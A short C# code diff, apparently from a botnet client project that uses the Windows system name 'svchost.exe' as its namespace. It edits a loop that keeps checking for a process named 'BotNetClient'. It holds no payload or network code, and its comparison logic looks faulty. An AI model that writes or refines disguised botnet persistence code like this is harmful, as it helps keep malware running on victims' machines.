@@ -48,10 +48,9 @@ namespace svchost.exe
                 var process = Process.GetProcessesByName("BotNetClient");
                 while (true)
                 {
-                    if (Array.IndexOf(process, pth) >= 0)
+                    if (process[0].ToString()== pth)
                     {
-                        Array.Clear(process, 0, process.Length);
-                        process = Process.GetProcessesByName(pth);
+                        process = Process.GetProcessesByName("BotNetClient");
                     }
                     else
                     {
